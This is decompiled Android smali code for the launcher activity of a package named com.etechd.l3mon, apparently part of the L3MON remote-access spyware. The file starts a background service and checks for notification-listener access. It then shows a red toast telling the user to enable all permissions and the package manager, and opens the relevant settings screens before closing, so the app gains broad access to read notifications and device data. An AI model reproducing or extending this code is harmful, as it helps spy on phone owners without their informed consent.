.class public Lcom/etechd/l3mon/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 69
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private isNotificationServiceRunning()Z
    .locals 8

    .prologue
    .line 64
    move-object v0, p0

    move-object v6, v0

    invoke-virtual {v6}, Lcom/etechd/l3mon/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    move-object v2, v6

    .line 65
    move-object v6, v2

    const-string v7, "enabled_notification_listeners"

    invoke-static {v6, v7}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    move-object v3, v6

    .line 67
    move-object v6, v0

    invoke-virtual {v6}, Lcom/etechd/l3mon/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v6

    move-object v4, v6

    .line 68
    move-object v6, v3

    if-eqz v6, :cond_0

    move-object v6, v3

    move-object v7, v4

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_1

    :cond_0
    const/4 v6, 0x0

    :goto_0
    move v0, v6

    return v0

    :cond_1
    const/4 v6, 0x1

    goto :goto_0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 17
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v11, v0

    const-string v12, "com.aide.ui"

    invoke-static {v11, v12}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 20
    move-object v11, v0

    move-object v12, v1

    invoke-super {v11, v12}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 22
    move-object v11, v0

    const/high16 v12, 0x7f040000

    invoke-virtual {v11, v12}, Lcom/etechd/l3mon/MainActivity;->setContentView(I)V

    .line 24
    move-object v11, v0

    invoke-static {v11}, Lcom/etechd/l3mon/MainService;->startService(Landroid/content/Context;)V

    .line 25
    move-object v11, v0

    invoke-direct {v11}, Lcom/etechd/l3mon/MainActivity;->isNotificationServiceRunning()Z

    move-result v11

    move v3, v11

    .line 26
    move v11, v3

    if-nez v11, :cond_0

    .line 28
    move-object v11, v0

    invoke-virtual {v11}, Lcom/etechd/l3mon/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v11

    move-object v4, v11

    .line 29
    const-string v11, "Click \'Permissions\'\nEnable ALL permissions\n Click back x2\n Enable \'Package Manager\'"

    move-object v5, v11

    .line 30
    const/4 v11, 0x1

    move v6, v11

    .line 32
    move-object v11, v4

    move-object v12, v5

    move v13, v6

    invoke-static {v11, v12, v13}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v11

    move-object v7, v11

    .line 34
    move-object v11, v7

    invoke-virtual {v11}, Landroid/widget/Toast;->getView()Landroid/view/View;

    move-result-object v11

    const v12, 0x102000b

    invoke-virtual {v11, v12}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Landroid/widget/TextView;

    move-object v8, v11

    .line 35
    move-object v11, v8

    const/high16 v12, -0x10000

    invoke-virtual {v11, v12}, Landroid/widget/TextView;->setTextColor(I)V

    .line 36
    move-object v11, v8

    sget-object v12, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v11, v12}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 37
    move-object v11, v8

    const/16 v12, 0x11

    invoke-virtual {v11, v12}, Landroid/widget/TextView;->setGravity(I)V

    .line 38
    move-object v11, v7

    invoke-virtual {v11}, Landroid/widget/Toast;->show()V

    .line 41
    move-object v11, v0

    new-instance v12, Landroid/content/Intent;

    move-object/from16 v16, v12

    move-object/from16 v12, v16

    move-object/from16 v13, v16

    const-string v14, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {v13, v14}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v12}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 54
    new-instance v11, Landroid/content/Intent;

    move-object/from16 v16, v11

    move-object/from16 v11, v16

    move-object/from16 v12, v16

    const-string v13, "android.settings.APPLICATION_DETAILS_SETTINGS"

    new-instance v14, Ljava/lang/StringBuffer;

    move-object/from16 v16, v14

    move-object/from16 v14, v16

    move-object/from16 v15, v16

    invoke-direct {v15}, Ljava/lang/StringBuffer;-><init>()V

    const-string v15, "package:"

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    move-object v15, v4

    invoke-virtual {v15}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v14

    invoke-direct {v12, v13, v14}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    move-object v9, v11

    .line 55
    move-object v11, v0

    move-object v12, v9

    invoke-virtual {v11, v12}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 58
    :cond_0
    move-object v11, v0

    invoke-virtual {v11}, Lcom/etechd/l3mon/MainActivity;->finish()V

    return-void
.end method
